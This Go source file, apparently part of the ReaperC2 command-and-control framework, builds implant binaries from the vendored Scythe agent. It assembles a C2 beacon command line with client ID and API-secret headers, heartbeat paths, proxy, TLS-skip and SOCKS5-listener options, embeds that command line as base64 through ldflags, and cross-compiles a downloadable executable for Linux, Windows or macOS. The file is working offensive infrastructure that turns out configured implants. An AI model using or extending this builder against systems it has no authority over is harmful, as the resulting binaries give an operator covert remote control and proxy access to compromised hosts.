// Package scythebuild constructs Scythe Http embedded argv and runs go build against
// github.com/BuildAndDestroy/Scythe (vendored under third_party/Scythe).
package scythebuild

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
)

// HTTPOptions mirrors Scythe Http CLI flags (see ./Scythe Http -h).
// Timeout is the HTTP client timeout (e.g. "30s"), independent of ReaperC2 heartbeat interval.
// Headers and Directories are merged with required auth and heartbeat paths (see MergeScytheHTTPHeaders / MergeScytheHTTPDirectories).
type HTTPOptions struct {
	Method        string
	Timeout       string // e.g. "5s", "2m"; default "30s"
	Body          string
	Directories   string // comma-separated extra paths; always merged with /heartbeat/<clientID>,/heartbeat
	Headers       string // comma-separated extra key:value pairs; always merged with Content-Type + X-Client-Id + X-API-Secret
	Proxy         string
	SkipTLSVerify bool
	// Socks5Listen enables embedded Scythe SOCKS5 listener (-socks5-listen -socks5-port <port>).
	Socks5Listen bool
	Socks5Port   int // 1–65535 when Socks5Listen is true
}

// DefaultHTTPOptions returns Method GET and Timeout "30s".
func DefaultHTTPOptions() HTTPOptions {
	return HTTPOptions{Method: "GET", Timeout: "30s"}
}

// MergeScytheHTTPHeaders returns Scythe -headers value: required C2 auth headers plus any extra pairs from userHeaders.
// If userHeaders already looks like a full header line (includes X-API-Secret and X-Client-Id), it is used as-is so legacy copy-paste does not duplicate auth.
func MergeScytheHTTPHeaders(clientID, secret, userHeaders string) string {
	base := fmt.Sprintf("Content-Type:application/json,X-Client-Id:%s,X-API-Secret:%s", clientID, secret)
	u := strings.TrimSpace(userHeaders)
	if u == "" {
		return base
	}
	// Full pasted -headers from an example (already contains auth).
	if strings.Contains(u, "X-API-Secret:") && strings.Contains(u, "X-Client-Id:") {
		return u
	}
	return base + "," + u
}

// MergeScytheHTTPDirectories returns Scythe -directories value: required heartbeat paths plus any extra paths from userDirs.
// If userDirs already includes this client's /heartbeat/<clientID> path, it is used as-is (full pasted example).
func MergeScytheHTTPDirectories(clientID, userDirs string) string {
	base := fmt.Sprintf("/heartbeat/%s,/heartbeat", clientID)
	u := strings.TrimSpace(userDirs)
	if u == "" {
		return base
	}
	if strings.Contains(u, "/heartbeat/"+clientID) {
		return u
	}
	return base + "," + u
}

// BuildHTTPEmbedTokens returns argv tokens for Scythe after the program name (subcommand "Http" first).
func BuildHTTPEmbedTokens(baseURL, clientID, secret string, o HTTPOptions) []string {
	method := strings.TrimSpace(o.Method)
	if method == "" {
		method = "GET"
	}
	timeout := strings.TrimSpace(o.Timeout)
	if timeout == "" {
		timeout = "30s"
	}
	dirs := MergeScytheHTTPDirectories(clientID, o.Directories)
	headers := MergeScytheHTTPHeaders(clientID, secret, o.Headers)

	out := []string{
		"Http",
		"-method", method,
		"-timeout", timeout,
		"-url", baseURL,
		"-headers", headers,
		"-directories", dirs,
	}
	if strings.TrimSpace(o.Body) != "" {
		out = append(out, "-body", o.Body)
	}
	if p := strings.TrimSpace(o.Proxy); p != "" {
		out = append(out, "-proxy", p)
	}
	if o.SkipTLSVerify {
		out = append(out, "-skip-tls-verify")
	}
	if o.Socks5Listen && o.Socks5Port >= 1 && o.Socks5Port <= 65535 {
		out = append(out, "-socks5-listen", "-socks5-port", strconv.Itoa(o.Socks5Port))
	}
	return out
}

// EmbedArgvBase64 returns base64(JSON.stringify(tokens)) for -ldflags EmbeddedArgv.
func EmbedArgvBase64(tokens []string) (string, error) {
	raw, err := json.Marshal(tokens)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(raw), nil
}

func isScytheModuleRoot(dir string) bool {
	st, err := os.Stat(filepath.Join(dir, "go.mod"))
	return err == nil && !st.IsDir()
}

// ResolveScytheSourceDir finds the Scythe checkout (directory containing go.mod and ./cmd).
// Resolution order: SCYTHE_SRC → REAPERC2_ROOT/third_party/Scythe → paths relative to the
// ReaperC2 binary (works when cwd is wrong, e.g. some Kubernetes setups) → Getwd()/third_party/Scythe
// (supports `go run` where the executable lives in a temp dir).
func ResolveScytheSourceDir() (string, error) {
	var candidates []string
	add := func(dir string) {
		dir = filepath.Clean(dir)
		for _, existing := range candidates {
			if existing == dir {
				return
			}
		}
		candidates = append(candidates, dir)
	}

	if v := strings.TrimSpace(os.Getenv("SCYTHE_SRC")); v != "" {
		add(v)
	}
	if root := strings.TrimSpace(os.Getenv("REAPERC2_ROOT")); root != "" {
		add(filepath.Join(filepath.Clean(root), "third_party", "Scythe"))
	}

	if exe, err := os.Executable(); err == nil {
		if resolved, err := filepath.EvalSymlinks(exe); err == nil {
			exe = resolved
		}
		exeDir := filepath.Dir(exe)
		// e.g. .../ReaperC2/ReaperC2 (binary at repo root)
		add(filepath.Join(exeDir, "third_party", "Scythe"))
		// e.g. .../ReaperC2/cmd/ReaperC2 (Dockerfile layout)
		add(filepath.Join(exeDir, "..", "third_party", "Scythe"))
	}

	if wd, err := os.Getwd(); err == nil {
		add(filepath.Join(wd, "third_party", "Scythe"))
	}

	for _, c := range candidates {
		if isScytheModuleRoot(c) {
			return c, nil
		}
	}
	return "", fmt.Errorf("scythe source not found (init submodule: third_party/Scythe); checked %d path(s), e.g. first: %q",
		len(candidates), firstOrPlaceholder(candidates))
}

func firstOrPlaceholder(c []string) string {
	if len(c) == 0 {
		return "(none)"
	}
	return c[0]
}

// Allowed cross-compile targets for embedded Scythe (GOOS/GOARCH).
var (
	validEmbedGOOS   = map[string]bool{"linux": true, "windows": true, "darwin": true}
	validEmbedGOARCH = map[string]bool{"amd64": true, "arm64": true}
)

// NormalizeEmbedTarget validates and lowercases GOOS/GOARCH. Empty values default to the build host.
func NormalizeEmbedTarget(goos, goarch string) (string, string, error) {
	goos = strings.ToLower(strings.TrimSpace(goos))
	goarch = strings.ToLower(strings.TrimSpace(goarch))
	if goos == "" {
		goos = runtime.GOOS
	}
	if goarch == "" {
		goarch = runtime.GOARCH
	}
	if !validEmbedGOOS[goos] {
		return "", "", fmt.Errorf("invalid goos %q (supported: linux, windows, darwin)", goos)
	}
	if !validEmbedGOARCH[goarch] {
		return "", "", fmt.Errorf("invalid goarch %q (supported: amd64, arm64)", goarch)
	}
	return goos, goarch, nil
}

// SuggestedAttachmentFilename returns a download filename for the embedded binary.
func SuggestedAttachmentFilename(clientShort, goos, goarch string) string {
	ext := ".bin"
	if goos == "windows" {
		ext = ".exe"
	}
	return fmt.Sprintf("Scythe-embedded-%s-%s-%s%s", clientShort, goos, goarch, ext)
}

// BuildEmbeddedBinary runs go build in the Scythe tree with EmbeddedArgv set to tokens.
// goos/goarch select the target platform (cross-compilation); use "" for host OS/ARCH.
func BuildEmbeddedBinary(ctx context.Context, tokens []string, goos, goarch string) ([]byte, error) {
	goos, goarch, err := NormalizeEmbedTarget(goos, goarch)
	if err != nil {
		return nil, err
	}
	b64, err := EmbedArgvBase64(tokens)
	if err != nil {
		return nil, err
	}
	root, err := ResolveScytheSourceDir()
	if err != nil {
		return nil, err
	}

	tmpDir, err := os.MkdirTemp("", "scythe-embedded-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)
	outName := "Scythe.embedded"
	if goos == "windows" {
		outName = "Scythe.embedded.exe"
	}
	outPath := filepath.Join(tmpDir, outName)

	ldflags := "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=" + b64
	cmd := exec.CommandContext(ctx, "go", "build", "-trimpath", "-ldflags", ldflags, "-o", outPath, "./cmd")
	cmd.Dir = root
	env := os.Environ()
	env = append(env, "CGO_ENABLED=0", "GOOS="+goos, "GOARCH="+goarch)
	cmd.Env = env
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("go build GOOS=%s GOARCH=%s in %s: %w\n%s", goos, goarch, root, err, strings.TrimSpace(stderr.String()))
	}
	return os.ReadFile(outPath)
}

// FormatCLIExample returns a one-line ./Scythe ... example for operators (not for embedding).
func FormatCLIExample(tokens []string) string {
	var b strings.Builder
	b.WriteString("./Scythe")
	for _, t := range tokens {
		b.WriteString(" ")
		if strings.ContainsAny(t, " \t\n'\"\\") {
			b.WriteString(fmt.Sprintf("%q", t))
		} else {
			b.WriteString(t)
		}
	}
	return b.String()
}
